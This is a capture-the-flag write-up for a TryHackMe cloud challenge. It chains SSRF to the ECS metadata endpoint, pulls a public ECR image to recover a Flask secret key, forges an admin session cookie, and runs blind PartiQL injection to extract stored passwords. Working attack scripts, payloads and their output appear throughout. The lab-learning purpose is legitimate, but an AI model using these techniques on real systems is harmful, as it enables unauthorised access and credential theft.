---
title: Love at First Breach — Cloud Nine
date: 2026-02-20 00:00:00 +0530
categories:
  - TryHackMe
  - Love At First Breach
tags:
  - Love-At-First-Breach
  - cloud
  - dynamodb
  - api
---

**Challenge:** Cloud Nine
**Category:** Cloud
**Difficulty:** Hard
**Flags:**

| # | Flag | Value |
|---|------|-------|
| 1 | FLAG1 | `THM{CUPID_ARROW_TEST_USER}` |
| 2 | FLAG2 | `THM{CUPID_ARROW_FLAG2}` |
| 3 | FLAG3 | `THM{partiqls_of_love}` |

---

## Recon & Enumeration

The target is a Flask web application running at `http://54.205.77.77:8080`. The landing page redirects to a login form. No default credentials work, and brute-forcing returns nothing useful.

Running a directory scan reveals a few interesting endpoints:

```
/login      - Login form
/admin      - Admin panel (requires auth + admin flag)
/status     - Status dashboard
/status/check?url=  - URL health check (SSRF!)
/status/env - Environment info
/shoot      - Game endpoint (red herring)
```

Hitting `/status/env` leaks the hostname:

```bash
$ curl -s http://54.205.77.77:8080/status/env
{"env": [{"key": "HOSTNAME", "value": "ip-172-31-93-102.ec2.internal"}]}
```

The `ec2.internal` hostname immediately tells us this is running on **AWS** — specifically an EC2-hosted container. The `172.31.x.x` CIDR confirms a default VPC subnet.

---

## Step 1 — SSRF Discovery

The `/status/check` endpoint takes a URL parameter and makes a server-side request. This is a classic **SSRF** (Server-Side Request Forgery) vector.

```bash
$ curl -s "http://54.205.77.77:8080/status/check?url=http://example.com" | python3 -m json.tool
{
    "url": "http://example.com",
    "ok": true,
    "status": 200,
    "latency_ms": 85,
    "error": null,
    "body": "<!doctype html>..."
}
```

The response includes the full body of the fetched URL — up to 4096 bytes.

### Trying EC2 Instance Metadata (169.254.169.254)

The first instinct for any cloud-hosted SSRF is to hit the **EC2 Instance Metadata Service (IMDS)**:

```bash
$ curl -s "http://54.205.77.77:8080/status/check?url=http://169.254.169.254/latest/meta-data/"
{
    "ok": false,
    "status": "error",
    "error": "<urlopen error [Errno 22] Invalid argument>"
}
```

Blocked! The `Invalid argument` error means something at the OS level (likely iptables or ECS network configuration) is dropping connections to `169.254.169.254`. All bypass attempts failed — hex IP, decimal IP, IPv6-mapped, DNS rebinding, etc.

### The ECS Metadata Breakthrough (169.254.170.2)

Since this is a **cloud** challenge and `169.254.169.254` is blocked, I tried the **ECS container metadata endpoint** at `169.254.170.2`:

```bash
$ curl -s "http://54.205.77.77:8080/status/check?url=http://169.254.170.2/v2/metadata" | python3 -m json.tool
```

```json
{
    "ok": true,
    "status": 200,
    "body": "{\"Cluster\":\"arn:aws:ecs:us-east-1:702126839589:cluster/cloudnine-cluster\",\"TaskARN\":\"arn:aws:ecs:us-east-1:702126839589:task/cloudnine-cluster/4b8055c651024e2eb6bba569fe8cfe37\",\"Family\":\"cloudnine-task\",\"Revision\":\"4\",\"DesiredStatus\":\"RUNNING\",\"KnownStatus\":\"RUNNING\",\"Containers\":[{\"DockerId\":\"4b8055c651024e2eb6bba569fe8cfe37-0527074092\",\"Name\":\"app\",\"Image\":\"public.ecr.aws/x2q4d0z7/cloudnine-app:latest\",...}"
}
```

**Jackpot.** The ECS task metadata reveals:

- **AWS Account ID:** `702126839589`
- **Region:** `us-east-1`
- **Cluster:** `cloudnine-cluster`
- **Task:** `cloudnine-task` (revision 4)
- **Container image:** `public.ecr.aws/x2q4d0z7/cloudnine-app:latest` (PUBLIC ECR image!)
- **Internal IP:** `172.31.93.102`
- **Launch type:** `FARGATE`

The image is hosted on **public ECR** — meaning anyone can pull it. This is the key to getting the application source code.

---

## Step 2 — Pulling the Docker Image from Public ECR (Without Docker)

I wrote a Python script to interact with the ECR registry API directly and download image layers.

```python
import requests, json, os, tarfile, re

BASE = "https://public.ecr.aws/v2/x2q4d0z7/cloudnine-app"

# Step 1: Get auth token
r = requests.get(f"{BASE}/tags/list")
auth_header = r.headers.get("Www-Authenticate", "")
realm = re.search(r'realm="([^"]+)"', auth_header).group(1)
service = re.search(r'service="([^"]+)"', auth_header).group(1)
scope = re.search(r'scope="([^"]+)"', auth_header).group(1)

r = requests.get(realm, params={"service": service, "scope": scope})
token = r.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# Step 2: Get manifest
r = requests.get(f"{BASE}/manifests/latest", headers={
    **headers,
    "Accept": "application/vnd.docker.distribution.manifest.v2+json"
})
manifest = r.json()

# Step 3: Download image config
config_digest = manifest["config"]["digest"]
r = requests.get(f"{BASE}/blobs/{config_digest}", headers=headers)
config = r.json()
print("Env:", config["config"]["Env"])
print("Cmd:", config["config"]["Cmd"])

# Step 4: Download all layers
for i, layer in enumerate(manifest["layers"]):
    digest = layer["digest"]
    r = requests.get(f"{BASE}/blobs/{digest}", headers=headers, stream=True)
    with open(f"image_layers/layer_{i}.tar.gz", "wb") as f:
        for chunk in r.iter_content(chunk_size=8192):
            f.write(chunk)
```

```
$ python3 pull_image.py
=== Getting auth token ===
Got token: eyJhbGciOiJSUzI1NiIsInR5c...

=== Getting manifest ===
Manifest status: 200

=== Getting image config ===
config:
  Env: ['PATH=/usr/local/bin:...', 'PYTHON_VERSION=3.12.12']
  Cmd: ['python', '/app/app.py']
  WorkingDir: /app

=== 8 layers to download ===
Layer 0: sha256:... (29380957 bytes)
...
Layer 6: sha256:... (2159 bytes)    <-- app.py lives here
Layer 7: sha256:... (3192 bytes)    <-- templates/ lives here
```

### Extracting the Source Code

The last two layers (6 and 7) contained the actual application code:

```bash
$ tar tzf image_layers/layer_6.tar.gz
app/
app/app.py

$ tar tzf image_layers/layer_7.tar.gz
app/templates/
app/templates/admin.html
app/templates/app.html
app/templates/login.html
app/templates/status.html

$ tar xzf image_layers/layer_6.tar.gz -C extracted/
$ tar xzf image_layers/layer_7.tar.gz -C extracted/
```

---

## Step 3 — Source Code Analysis (FLAG1)

The extracted `app.py` is the entire Flask application. Reading through it reveals everything:

### Hardcoded Flask Secret Key

```python
app.secret_key = "change-me-in-production-but-for-real-this-time-please-no-kidding"
```

A long passphrase — this is why all our brute-force attempts (hashcat, rockyou) failed. It's not a short password; it's a full sentence.

### Test Credentials & FLAG1

```python
# remember you can use these credentials to test the login page:
# username: test
# password: cup1dkuPiDqup!d
# FLAG1: THM{CUPID_ARROW_TEST_USER}
```

**FLAG1: `THM{CUPID_ARROW_TEST_USER}`**

Found as a comment in the source code alongside hardcoded test credentials.

### DynamoDB Backend

```python
USERS_TABLE = os.getenv("USERS_TABLE", "cupid-users")
dynamodb = boto3.resource("dynamodb", region_name=AWS_REGION)
users_table = dynamodb.Table(USERS_TABLE)
```

The database is **DynamoDB**, not SQL. This explains why `sqlmap` earlier reported "not injectable" — it's a NoSQL database using PartiQL.

### FLAG2 from Environment Variable

```python
FLAG2 = os.getenv("FLAG2", "THM{test_flag}")
```

FLAG2 is loaded from an environment variable and rendered on the admin panel. The default is a test flag — the real one is only available in the running ECS container.

### The Vulnerable Admin Panel (PartiQL Injection)

The admin panel's "lookup" function has a textbook injection vulnerability:

```python
if action == "lookup":
    response = dynamodb.meta.client.execute_statement(
        Statement="SELECT * FROM \"" + USERS_TABLE + "\" WHERE username = '" + username + "'"
    )
```

The `username` parameter is concatenated directly into a **PartiQL** statement with zero sanitization.

---

## Step 4 — Forging an Admin Cookie (FLAG2)

With the Flask secret key in hand, forging a session cookie with admin privileges is trivial.

### Signing the Cookie

```python
from itsdangerous import URLSafeTimedSerializer
import hashlib

secret = 'change-me-in-production-but-for-real-this-time-please-no-kidding'
s = URLSafeTimedSerializer(
    secret,
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
)
cookie = s.dumps({'user': 'admin', 'admin': True})
print(cookie)
```

```
$ python3 forge_cookie.py
eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.aZJNFA.IpPaB6WMkaDtxbq04TM1N1TKrTo
```

### Accessing the Admin Panel

```bash
$ curl -s -b "session=eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.aZJNFA.IpPaB6WMkaDtxbq04TM1N1TKrTo" \
  http://54.205.77.77:8080/admin | grep "FLAG2"
```

```html
<div class="message">FLAG2: THM{CUPID_ARROW_FLAG2}</div>
```

**FLAG2: `THM{CUPID_ARROW_FLAG2}`**

---

## Step 5 — Blind PartiQL Injection (FLAG3)

The admin panel is now accessible, but FLAG3 isn't displayed anywhere in the UI. It must be hidden inside the DynamoDB table — specifically in user attributes that aren't rendered by the template (like the `password` field).

### Understanding the Vulnerability

The vulnerable query:

```
SELECT * FROM "cupid-users" WHERE username = '<USER_INPUT>'
```

We control `<USER_INPUT>`. The challenge is that DynamoDB's PartiQL **doesn't support SQL comments** (`--`), so we can't just truncate the trailing quote. Instead, we need to consume it.

The injection pattern:

```
test' AND <condition> AND username='test
```

This produces:

```sql
SELECT * FROM "cupid-users" WHERE username = 'test' AND <condition> AND username='test'
```

When `<condition>` is true → the user `test` is returned ("User loaded.")  
When `<condition>` is false → no results ("User not found.")

This gives us a **blind boolean oracle**.

### Enumerating Users

First, enumerate all usernames using `begins_with()`:

```python
# For each letter of the alphabet:
payload = f"x' OR begins_with(username, '{letter}') OR username='"
```

This produces:

```sql
SELECT * FROM "cupid-users" WHERE username = 'x' OR begins_with(username, 'b') OR username=''
```

Results:

| Prefix | User | Full Name | Email |
|--------|------|-----------|-------|
| b | bob | Bob Smith | bsmith@cupid.thm |
| c | cupid | The one and only Cupid | cupid@thm.thm |
| d | demo | Demo User | demo@example.thm |
| g | guest | AAAAA | aaaa@thm.thm |
| t | test | Test Account | cupidtest@thm.thm |

### The Reserved Word Trap

My first attempt to extract passwords:

```
test' AND begins_with(password, 'c') AND username='test
```

→ **500 Internal Server Error**

`password` is a **DynamoDB reserved word**. It must be double-quoted:

```
test' AND begins_with("password", 'c') AND username='test
```

→ **200 OK — "User loaded."** (because test's password starts with 'c')

Testing with a false condition:

```
test' AND begins_with("password", 'z') AND username='test
```

→ **200 OK — "User not found."**

The blind oracle works.

### Extracting Passwords Character-by-Character

```python
def check_password_prefix(user, prefix):
    prefix_escaped = prefix.replace("'", "''")
    payload = f'''{user}' AND begins_with("password", '{prefix_escaped}') AND username='{user}'''
    r = requests.post(f"{BASE_URL}/admin",
        data={"username": payload, "action": "lookup", ...},
        cookies=COOKIE, headers=UA, timeout=20)
    return "User loaded." in r.text

def extract_password(user):
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()_+-={}[]|:;<>?,./ "
    password = ""
    for pos in range(60):
        found_char = False
        for c in charset:
            if check_password_prefix(user, password + c):
                password += c
                found_char = True
                break
        if not found_char:
            break
    return password
```

Running the extraction:

```
$ python3 extract_passwords.py

=== Verifying with test user (known pw: cup1dkuPiDqup!d) ===
  test password starts with 'c': True
  test password starts with 'cup1d': True

=== Extracting password for 'cupid' ===
  Password: THM{partiqls_of_love}
  Full password: THM{partiqls_of_love}

=== Extracting password for 'bob' ===
...
...
```

**FLAG3: `THM{partiqls_of_love}`**

The flag was hidden as the `cupid` user's **password** in DynamoDB — an attribute that the admin panel's template never displays. The only way to extract it was through blind PartiQL injection.

---

## Summary

### Full Attack Chain

```
SSRF (/status/check)
  └──> ECS Metadata (169.254.170.2/v2/metadata)
         └──> Public ECR Image URL (public.ecr.aws/x2q4d0z7/cloudnine-app:latest)
                └──> Pull Docker Image Layers (Registry API, no docker needed)
                       └──> Extract Source Code (app.py)
                              ├──> FLAG1 in comments: THM{CUPID_ARROW_TEST_USER}
                              ├──> Flask Secret Key
                              │     └──> Forge Admin Cookie (itsdangerous)
                              │           └──> Admin Panel (/admin)
                              │                 └──> FLAG2: THM{CUPID_ARROW_FLAG2}
                              └──> PartiQL Injection Vulnerability
                                    └──> Blind Boolean Extraction
                                          └──> Cupid's Password
                                                └──> FLAG3: THM{partiqls_of_love}
```

### Key Takeaways

1. **ECS Metadata at 169.254.170.2** — Even when IMDS (169.254.169.254) is blocked, ECS Fargate containers expose metadata at a different link-local address. Always check both.

2. **Public ECR Images** — Container images pushed to public ECR registries can be pulled by anyone. This exposed the full application source code including the Flask secret key.

3. **DynamoDB ≠ SQL** — `sqlmap` was useless here because the backend is DynamoDB using **PartiQL**. PartiQL looks like SQL but has different syntax rules (no `--` comments, reserved word escaping with double-quotes).

4. **Blind PartiQL Injection** — Even though the admin panel only shows a few fields (full_name, email, admin), other attributes like `password` can be extracted character-by-character using `begins_with()` as a boolean oracle.